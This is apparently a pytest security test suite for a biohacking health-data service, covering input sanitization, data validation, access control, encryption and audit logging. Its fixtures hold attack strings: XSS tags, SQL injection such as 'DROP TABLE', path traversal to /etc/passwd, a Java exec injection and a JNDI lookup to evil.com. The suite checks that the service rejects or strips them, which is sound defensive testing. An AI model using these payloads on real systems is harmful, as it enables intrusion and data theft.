"""
NOVA Biohacking Innovator - Security Testing.
Comprehensive security testing for biohacking data protection and compliance.
"""

import pytest
import asyncio
import json
import hashlib
import hmac
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch
from typing import Dict, Any, List

# NOVA Core imports
from core import NovaDependencies, NovaConfig, NovaBaseError, BiohackingProtocolError
from services import (
    BiohackingSecurityService,
    BiohackingDataService,
    BiohackingIntegrationService,
)
from skills_manager import NovaSkillsManager


class TestInputSanitization:
    """Test input sanitization and validation for biohacking data."""

    def test_malicious_input_sanitization(self):
        """Test sanitization of various malicious inputs."""
        security_service = BiohackingSecurityService()

        malicious_inputs = [
            "<script>alert('xss')</script>longevity optimization",
            "'; DROP TABLE biomarkers; -- optimize my health",
            "../../../etc/passwd biohacking protocols",
            "${java.lang.Runtime.getRuntime().exec('id')} cognitive enhancement",
            "javascript:void(0) hormonal optimization",
            "vbscript:msgbox('exploit') supplement recommendations",
            "data:text/html,<script>alert('xss')</script> wearable analysis",
            "onload=alert('xss') biomarker interpretation",
        ]

        for malicious_input in malicious_inputs:
            sanitized = security_service.sanitize_user_input(malicious_input)

            # Should remove dangerous patterns
            assert "<script>" not in sanitized
            assert "DROP TABLE" not in sanitized
            assert "../" not in sanitized
            assert "javascript:" not in sanitized
            assert "vbscript:" not in sanitized
            assert "onload=" not in sanitized

            # Should preserve legitimate biohacking content
            legitimate_terms = [
                "longevity",
                "optimization",
                "health",
                "cognitive",
                "hormonal",
                "supplement",
                "biomarker",
            ]
            has_legitimate_content = any(
                term in sanitized.lower() for term in legitimate_terms
            )
            assert (
                has_legitimate_content
            ), f"Legitimate content removed from: {sanitized}"

    def test_length_limiting(self):
        """Test input length limiting."""
        security_service = BiohackingSecurityService()

        # Test very long input
        long_input = "biohacking optimization " * 200  # ~4600 characters
        sanitized = security_service.sanitize_user_input(long_input)

        # Should be truncated to reasonable length
        assert len(sanitized) <= 2000
        assert "biohacking" in sanitized  # Should preserve beginning

    def test_control_character_removal(self):
        """Test removal of control characters."""
        security_service = BiohackingSecurityService()

        input_with_controls = "longevity\x00optimization\x08biohacking\x0cprotocols\x1f"
        sanitized = security_service.sanitize_user_input(input_with_controls)

        # Should remove control characters
        assert "\x00" not in sanitized
        assert "\x08" not in sanitized
        assert "\x0c" not in sanitized
        assert "\x1f" not in sanitized

        # Should preserve content
        assert "longevity" in sanitized
        assert "optimization" in sanitized
        assert "biohacking" in sanitized
        assert "protocols" in sanitized

    def test_html_entity_encoding(self):
        """Test HTML entity encoding of special characters."""
        security_service = BiohackingSecurityService()

        input_with_html = "longevity <optimization> & \"biohacking\" 'protocols'"
        sanitized = security_service.sanitize_user_input(input_with_html)

        # Should encode HTML entities
        assert "&lt;" in sanitized
        assert "&gt;" in sanitized
        assert "&amp;" in sanitized
        assert "&quot;" in sanitized
        assert "&#x27;" in sanitized


class TestBiomarkerDataValidation:
    """Test validation of biomarker data for security and correctness."""

    def test_valid_biomarker_data(self):
        """Test validation of valid biomarker data."""
        security_service = BiohackingSecurityService()

        valid_biomarkers = [
            {
                "name": "Vitamin D",
                "value": "45 ng/mL",
                "reference_range": "30-80 ng/mL",
            },
            {"name": "HbA1c", "value": "5.2%", "reference_range": "4.5-5.6%"},
            {
                "name": "Testosterone",
                "value": "650 ng/dL",
                "reference_range": "300-800 ng/dL",
            },
            {"name": "CRP", "value": "0.8 mg/L", "reference_range": "<3.0 mg/L"},
            {"name": "Cortisol", "value": "12 µg/dL", "reference_range": "6-18 µg/dL"},
        ]

        for biomarker in valid_biomarkers:
            assert security_service.validate_biomarker_data(biomarker) == True

    def test_invalid_biomarker_data(self):
        """Test rejection of invalid biomarker data."""
        security_service = BiohackingSecurityService()

        invalid_biomarkers = [
            # Missing required fields
            {"name": "Vitamin D"},  # Missing value
            {"value": "45 ng/mL"},  # Missing name
            {},  # Empty data
            # Invalid data types
            {"name": 123, "value": "45 ng/mL"},  # Non-string name
            {"name": "Vitamin D", "value": 45},  # Non-string value
            # Invalid formats
            {
                "name": "<script>alert('xss')</script>",
                "value": "45 ng/mL",
            },  # Malicious name
            {"name": "Vitamin D", "value": "not_a_number"},  # Invalid value format
            {"name": "A" * 200, "value": "45 ng/mL"},  # Name too long
            # Out of range values
            {"name": "Vitamin D", "value": "-50 ng/mL"},  # Negative value
            {"name": "HbA1c", "value": "999%"},  # Unrealistic value
            {"name": "Temperature", "value": "1000 degrees"},  # Extreme value
        ]

        for biomarker in invalid_biomarkers:
            assert security_service.validate_biomarker_data(biomarker) == False

    def test_biomarker_value_range_validation(self):
        """Test biomarker value range validation."""
        security_service = BiohackingSecurityService()

        # Test boundary values
        boundary_tests = [
            {"name": "Vitamin D", "value": "0 ng/mL"},  # Minimum boundary
            {"name": "Vitamin D", "value": "1000 ng/mL"},  # Near maximum boundary
            {"name": "HbA1c", "value": "0.1%"},  # Very low
            {"name": "HbA1c", "value": "15.0%"},  # High but possible
        ]

        for biomarker in boundary_tests:
            result = security_service.validate_biomarker_data(biomarker)
            # Should validate based on reasonable medical ranges
            if float(biomarker["value"].split()[0]) >= 0:
                assert result in [True, False]  # Should make a decision

    def test_biomarker_injection_attacks(self):
        """Test protection against injection attacks via biomarker data."""
        security_service = BiohackingSecurityService()

        injection_attempts = [
            {"name": "'; DROP TABLE users; --", "value": "45 ng/mL"},
            {"name": "Vitamin D", "value": "45'; DELETE FROM biomarkers; --"},
            {"name": "UNION SELECT * FROM passwords", "value": "malicious"},
            {"name": "../../../etc/passwd", "value": "system_file"},
            {"name": "Vitamin D", "value": "${jndi:ldap://evil.com/exploit}"},
        ]

        for injection_attempt in injection_attempts:
            result = security_service.validate_biomarker_data(injection_attempt)
            assert (
                result == False
            ), f"Should reject injection attempt: {injection_attempt}"


class TestWearableDataValidation:
    """Test validation of wearable device data."""

    def test_valid_wearable_data(self):
        """Test validation of valid wearable device data."""
        security_service = BiohackingSecurityService()

        valid_wearable_data = [
            {
                "device_type": "oura",
                "metrics": {"sleep_score": 85, "hrv": 45.2, "temperature": 98.6},
            },
            {
                "device_type": "whoop",
                "metrics": {"strain": 14.2, "recovery": 73, "heart_rate": 65},
            },
            {
                "device_type": "apple_watch",
                "metrics": {"steps": 8542, "exercise_minutes": 45, "stand_hours": 10},
            },
        ]

        for wearable_data in valid_wearable_data:
            assert security_service.validate_wearable_data(wearable_data) == True

    def test_invalid_wearable_data(self):
        """Test rejection of invalid wearable data."""
        security_service = BiohackingSecurityService()

        invalid_wearable_data = [
            # Invalid device types
            {"device_type": "malicious_device", "metrics": {"fake": "data"}},
            {"device_type": "<script>alert('xss')</script>", "metrics": {}},
            {"device_type": "unknown_brand", "metrics": {"test": 123}},
            # Invalid metrics structure
            {"device_type": "oura", "metrics": "not_a_dict"},
            {"device_type": "whoop", "metrics": ["not", "dict", "format"]},
            # Out of range metric values
            {"device_type": "oura", "metrics": {"heart_rate": 500}},  # Unrealistic HR
            {
                "device_type": "whoop",
                "metrics": {"temperature": 150},
            },  # Impossible temp
            {
                "device_type": "apple_watch",
                "metrics": {"steps": -1000},
            },  # Negative steps
        ]

        for wearable_data in invalid_wearable_data:
            assert security_service.validate_wearable_data(wearable_data) == False

    def test_metric_value_validation(self):
        """Test individual metric value validation."""
        security_service = BiohackingSecurityService()

        # Test heart rate validation
        assert (
            security_service._validate_metric_value("heart_rate", 72) == True
        )  # Normal
        assert (
            security_service._validate_metric_value("heart_rate", 25) == False
        )  # Too low
        assert (
            security_service._validate_metric_value("heart_rate", 350) == False
        )  # Too high

        # Test temperature validation
        assert (
            security_service._validate_metric_value("temperature", 98.6) == True
        )  # Normal
        assert (
            security_service._validate_metric_value("temperature", 85) == False
        )  # Too low
        assert (
            security_service._validate_metric_value("temperature", 115) == False
        )  # Too high

        # Test steps validation
        assert security_service._validate_metric_value("steps", 10000) == True  # Normal
        assert (
            security_service._validate_metric_value("steps", -100) == False
        )  # Negative
        assert (
            security_service._validate_metric_value("steps", 200000) == False
        )  # Unrealistic

        # Test sleep validation
        assert (
            security_service._validate_metric_value("sleep_hours", 8) == True
        )  # Normal
        assert (
            security_service._validate_metric_value("sleep_hours", -2) == False
        )  # Negative
        assert (
            security_service._validate_metric_value("sleep_hours", 30) == False
        )  # Too many hours


class TestAccessControl:
    """Test access control and authorization for biohacking operations."""

    def test_valid_operation_permissions(self):
        """Test permissions for valid biohacking operations."""
        security_service = BiohackingSecurityService()

        valid_operations = [
            "biohacking_analysis",
            "protocol_generation",
            "biomarker_analysis",
            "wearable_analysis",
            "research_synthesis",
            "supplement_recommendations",
        ]

        user_id = "test_user_001"

        for operation in valid_operations:
            # Test user's own resources
            user_resource = f"user_{user_id}_data"
            assert (
                security_service.check_access_permissions(
                    user_id, operation, user_resource
                )
                == True
            )

            # Test public resources
            public_resource = "research_database"
            assert (
                security_service.check_access_permissions(
                    user_id, operation, public_resource
                )
                == True
            )

    def test_invalid_operation_rejection(self):
        """Test rejection of invalid operations."""
        security_service = BiohackingSecurityService()

        invalid_operations = [
            "delete_all_data",
            "admin_access",
            "system_override",
            "malicious_operation",
            "unauthorized_access",
        ]

        user_id = "test_user_001"
        resource = "any_resource"

        for operation in invalid_operations:
            assert (
                security_service.check_access_permissions(user_id, operation, resource)
                == False
            )

    def test_resource_access_control(self):
        """Test resource-based access control."""
        security_service = BiohackingSecurityService()

        user_id = "test_user_001"
        operation = "biohacking_analysis"

        # User should access their own resources
        own_resource = f"user_{user_id}_protocols"
        assert (
            security_service.check_access_permissions(user_id, operation, own_resource)
            == True
        )

        # User should NOT access other users' resources
        other_resource = "user_other_user_data"
        assert (
            security_service.check_access_permissions(
                user_id, operation, other_resource
            )
            == False
        )

        # User should access public resources
        public_resources = [
            "research_database",
            "protocol_templates",
            "supplement_database",
            "biomarker_references",
        ]

        for resource in public_resources:
            assert (
                security_service.check_access_permissions(user_id, operation, resource)
                == True
            )


class TestDataEncryption:
    """Test data encryption for sensitive biohacking information."""

    def test_sensitive_data_encryption(self):
        """Test encryption of sensitive biohacking data."""
        security_service = BiohackingSecurityService()

        sensitive_data = [
            "Testosterone: 450 ng/dL, needs optimization",
            "Genetic variant: APOE4 positive, alzheimer's risk",
            "Personal protocol: experimental NAD+ supplementation",
            "Biomarker trend: declining HGH levels over 6 months",
        ]

        for data in sensitive_data:
            encrypted = security_service.encrypt_sensitive_data(
                data, "biohacking_protocol"
            )

            # Should produce encrypted output
            assert encrypted != data
            assert len(encrypted) > len(data)  # Encrypted data is longer
            assert ":" in encrypted  # Should have salt:encrypted format

    def test_encryption_consistency(self):
        """Test encryption produces different outputs for same input."""
        security_service = BiohackingSecurityService()

        sensitive_data = "Testosterone: 450 ng/dL"

        # Multiple encryptions should produce different results (due to salt)
        encrypted1 = security_service.encrypt_sensitive_data(sensitive_data, "protocol")
        encrypted2 = security_service.encrypt_sensitive_data(sensitive_data, "protocol")

        assert encrypted1 != encrypted2  # Should be different due to random salt

        # But should be deterministic with same salt (for testing)
        # This would require a fixed salt in test mode

    def test_encryption_context_separation(self):
        """Test that different contexts produce different encryptions."""
        security_service = BiohackingSecurityService()

        data = "Sensitive biohacking information"

        biomarker_encrypted = security_service.encrypt_sensitive_data(data, "biomarker")
        protocol_encrypted = security_service.encrypt_sensitive_data(data, "protocol")

        # Different contexts should produce different encryptions
        assert biomarker_encrypted != protocol_encrypted


class TestAuditLogging:
    """Test audit logging for biohacking operations."""

    def test_successful_operation_logging(self):
        """Test logging of successful biohacking operations."""
        security_service = BiohackingSecurityService()

        # Mock Redis connection for testing
        with patch(
            "services.biohacking_security_service.get_redis_connection"
        ) as mock_redis:
            mock_redis_client = Mock()
            mock_redis.__enter__.return_value = mock_redis_client

            security_service.log_biohacking_operation(
                user_id="test_user",
                operation="longevity_optimization",
                resource="user_protocol_001",
                success=True,
                details={"protocol_type": "longevity", "complexity": "intermediate"},
                ip_address="192.168.1.100",
            )

            # Verify Redis logging was called
            mock_redis_client.lpush.assert_called_once()
            mock_redis_client.expire.assert_called_once()

    def test_failed_operation_logging(self):
        """Test logging of failed biohacking operations."""
        security_service = BiohackingSecurityService()

        with patch(
            "services.biohacking_security_service.get_redis_connection"
        ) as mock_redis:
            mock_redis_client = Mock()
            mock_redis.__enter__.return_value = mock_redis_client

            security_service.log_biohacking_operation(
                user_id="test_user",
                operation="biomarker_analysis",
                resource="invalid_biomarker_data",
                success=False,
                details={"error": "invalid_data_format", "severity": "medium"},
                ip_address="192.168.1.100",
            )

            # Verify failed operation was logged
            mock_redis_client.lpush.assert_called_once()
            mock_redis_client.expire.assert_called_once()

    def test_audit_log_data_structure(self):
        """Test audit log data structure and content."""
        security_service = BiohackingSecurityService()

        # Capture the audit log data
        with patch(
            "services.biohacking_security_service.get_redis_connection"
        ) as mock_redis:
            mock_redis_client = Mock()
            mock_redis.__enter__.return_value = mock_redis_client

            test_details = {
                "protocol_id": "longevity_001",
                "biomarker_count": 5,
                "risk_level": "low",
            }

            security_service.log_biohacking_operation(
                user_id="audit_test_user",
                operation="protocol_generation",
                resource="longevity_protocol",
                success=True,
                details=test_details,
                ip_address="10.0.0.1",
            )

            # Verify the structure of logged data
            call_args = mock_redis_client.lpush.call_args
            audit_key = call_args[0][0]

            # Audit key should include user and date
            assert "biohacking_audit:audit_test_user" in audit_key
            assert datetime.utcnow().strftime("%Y%m%d") in audit_key


class TestResearchCitationValidation:
    """Test validation of research citations for protocol safety."""

    def test_valid_research_citations(self):
        """Test validation of valid research citations."""
        security_service = BiohackingSecurityService()

        valid_citations = [
            {
                "title": "Intermittent Fasting and Longevity: A Comprehensive Review",
                "authors": ["Dr. Smith", "Dr. Johnson"],
                "journal": "Nature Aging",
                "year": 2023,
                "doi": "10.1038/s43587-023-00001-1",
            },
            {
                "title": "NAD+ Supplementation Effects on Cellular Aging",
                "authors": ["Research Team A"],
                "journal": "Cell Metabolism",
                "year": 2024,
            },
            {
                "title": "Cognitive Enhancement Through Nootropic Compounds",
                "authors": ["Dr. Cognitive", "Dr. Enhancement"],
                "journal": "Journal of Biohacking",
                "year": 2022,
                "abstract": "Study of cognitive enhancement protocols...",
            },
        ]

        for citation in valid_citations:
            assert security_service.validate_research_citation(citation) == True

    def test_invalid_research_citations(self):
        """Test rejection of invalid research citations."""
        security_service = BiohackingSecurityService()

        invalid_citations = [
            # Missing required fields
            {"title": "Test Study"},  # Missing authors, journal, year
            {"authors": ["Dr. Test"], "year": 2023},  # Missing title, journal
            {},  # Empty citation
            # Invalid year values
            {
                "title": "Old Study",
                "authors": ["Dr. Old"],
                "journal": "Ancient Journal",
                "year": 1800,
            },  # Too old
            {
                "title": "Future Study",
                "authors": ["Dr. Future"],
                "journal": "Future Journal",
                "year": 2030,
            },  # Future
            {
                "title": "Invalid Year",
                "authors": ["Dr. Test"],
                "journal": "Test Journal",
                "year": "not_a_year",
            },
            # Invalid title lengths
            {
                "title": "A",
                "authors": ["Dr. Test"],
                "journal": "Test Journal",
                "year": 2023,
            },  # Too short
            {
                "title": "A" * 600,
                "authors": ["Dr. Test"],
                "journal": "Test Journal",
                "year": 2023,
            },  # Too long
            # Suspicious content
            {
                "title": "<script>alert('xss')</script>Malicious Research",
                "authors": ["Dr. Malicious"],
                "journal": "Hacker Journal",
                "year": 2023,
            },
        ]

        for citation in invalid_citations:
            assert security_service.validate_research_citation(citation) == False

    def test_citation_content_sanitization(self):
        """Test sanitization of research citation content."""
        security_service = BiohackingSecurityService()

        # Citation with potentially malicious content should be rejected
        malicious_citation = {
            "title": "Legitimate Research Title",
            "authors": ["'; DROP TABLE research; --", "Dr. Injection"],
            "journal": "Security Test Journal",
            "year": 2023,
        }

        assert security_service.validate_research_citation(malicious_citation) == False


class TestProtocolDataSanitization:
    """Test sanitization of biohacking protocol data."""

    def test_protocol_data_sanitization(self):
        """Test comprehensive protocol data sanitization."""
        security_service = BiohackingSecurityService()

        dirty_protocol = {
            "protocol_id": "longevity_001",
            "name": "<script>alert('xss')</script>Longevity Protocol",
            "description": "A comprehensive protocol for longevity & optimization",
            "steps": [
                {
                    "step": 1,
                    "action": "Intermittent fasting with <script>malicious</script> timing",
                    "duration": "16:8 schedule",
                },
                {
                    "step": 2,
                    "action": "Cold exposure therapy",
                    "duration": "3 minutes at 50°F",
                },
            ],
            "warnings": [
                "Consult physician before starting",
                "'; DROP TABLE protocols; -- Monitor for side effects",
            ],
            "research_citations": [
                "doi:10.1038/nature.2023.001",
                "https://malicious-site.com/research",
            ],
        }

        sanitized = security_service.sanitize_protocol_data(dirty_protocol)

        # Check that malicious content is removed
        assert "<script>" not in sanitized["name"]
        assert "DROP TABLE" not in sanitized["warnings"][1]

        # Check that legitimate content is preserved
        assert "Longevity Protocol" in sanitized["name"]
        assert "Intermittent fasting" in sanitized["steps"][0]["action"]
        assert "Cold exposure therapy" in sanitized["steps"][1]["action"]
        assert "Consult physician" in sanitized["warnings"][0]

        # Check nested sanitization
        for step in sanitized["steps"]:
            assert "<script>" not in step["action"]

    def test_nested_protocol_sanitization(self):
        """Test sanitization of deeply nested protocol structures."""
        security_service = BiohackingSecurityService()

        nested_protocol = {
            "protocol_data": {
                "supplements": {
                    "morning_stack": {
                        "vitamin_d": "2000 IU with <script>alert('hack')</script> timing",
                        "omega_3": "1000mg fish oil",
                    },
                    "evening_stack": {
                        "magnesium": "400mg before bed",
                        "melatonin": "'; DROP TABLE supplements; -- 3mg sublingual",
                    },
                }
            }
        }

        sanitized = security_service.sanitize_protocol_data(nested_protocol)

        # Check deep nested sanitization
        morning_vit_d = sanitized["protocol_data"]["supplements"]["morning_stack"][
            "vitamin_d"
        ]
        evening_melatonin = sanitized["protocol_data"]["supplements"]["evening_stack"][
            "melatonin"
        ]

        assert "<script>" not in morning_vit_d
        assert "DROP TABLE" not in evening_melatonin
        assert "2000 IU" in morning_vit_d  # Preserve legitimate content
        assert "3mg sublingual" in evening_melatonin  # Preserve legitimate content


class TestIntegrationSecurity:
    """Test security integration across NOVA system components."""

    @pytest.mark.asyncio
    async def test_end_to_end_security_flow(self, nova_dependencies, nova_config):
        """Test security integration in complete workflow."""
        skills_manager = NovaSkillsManager(nova_dependencies, nova_config)

        # Test with potentially malicious input
        malicious_query = "<script>alert('xss')</script>optimize my longevity with '; DROP TABLE users; --"
        malicious_context = {
            "user_id": "'; DELETE FROM protocols; --",
            "program_type": "LONGEVITY",
            "biomarker_data": {
                "name": "../../../etc/passwd",
                "value": "${jndi:ldap://evil.com/exploit}",
            },
        }

        # Mock security service to verify it's called
        skills_manager.security_service.sanitize_user_input = Mock(
            return_value="optimize my longevity"
        )
        skills_manager.security_service.validate_biomarker_data = Mock(
            return_value=False  # Should reject malicious biomarker data
        )

        # Execute potentially malicious request
        result = await skills_manager.process_message(
            malicious_query, malicious_context
        )

        # Verify security measures were applied
        skills_manager.security_service.sanitize_user_input.assert_called_once()

        # System should handle gracefully
        assert isinstance(result, dict)
        # Should not crash or expose sensitive information

    @pytest.mark.asyncio
    async def test_rate_limiting_simulation(self, nova_dependencies, nova_config):
        """Test rate limiting and abuse protection."""
        skills_manager = NovaSkillsManager(nova_dependencies, nova_config)

        # Simulate rapid requests from same user
        rapid_context = {"user_id": "rate_limit_test", "program_type": "LONGEVITY"}
        request_count = 0
        successful_requests = 0

        # Send 30 rapid requests
        for i in range(30):
            try:
                result = await skills_manager.process_message(
                    f"Request {i}", rapid_context
                )
                request_count += 1
                if result.get("success"):
                    successful_requests += 1
            except Exception:
                request_count += 1
                # Rate limiting might cause exceptions

        # Should handle rapid requests gracefully
        # In a real implementation, rate limiting would block some requests
        assert request_count == 30
        # Most requests should succeed in test environment
        assert successful_requests >= 20

    def test_security_configuration_validation(self):
        """Test security configuration is properly set."""
        security_service = BiohackingSecurityService()

        # Verify security patterns are initialized
        assert len(security_service.dangerous_patterns) > 0
        assert len(security_service.biomarker_patterns) > 0
        assert len(security_service.wearable_patterns) > 0

        # Verify compiled patterns exist
        assert len(security_service.compiled_dangerous) > 0
        assert len(security_service.compiled_biomarker) > 0
        assert len(security_service.compiled_wearable) > 0

        # Test pattern effectiveness
        test_dangerous = "<script>alert('test')</script>"
        detected = any(
            pattern.search(test_dangerous)
            for pattern in security_service.compiled_dangerous
        )
        assert detected == True, "Dangerous pattern detection not working"

    def test_data_privacy_compliance(self):
        """Test data privacy and compliance features."""
        security_service = BiohackingSecurityService()

        # Test that sensitive operations require proper authorization
        sensitive_operations = [
            "access_genetic_data",
            "view_health_records",
            "export_biomarker_history",
            "share_protocol_data",
        ]

        # These operations should require special handling
        for operation in sensitive_operations:
            # In a real implementation, these would have additional checks
            # For now, verify they're not in the allowed operations list
            allowed_ops = [
                "biohacking_analysis",
                "protocol_generation",
                "biomarker_analysis",
                "wearable_analysis",
                "research_synthesis",
                "supplement_recommendations",
            ]
            assert (
                operation not in allowed_ops
            ), f"Sensitive operation {operation} should not be in basic allowed operations"
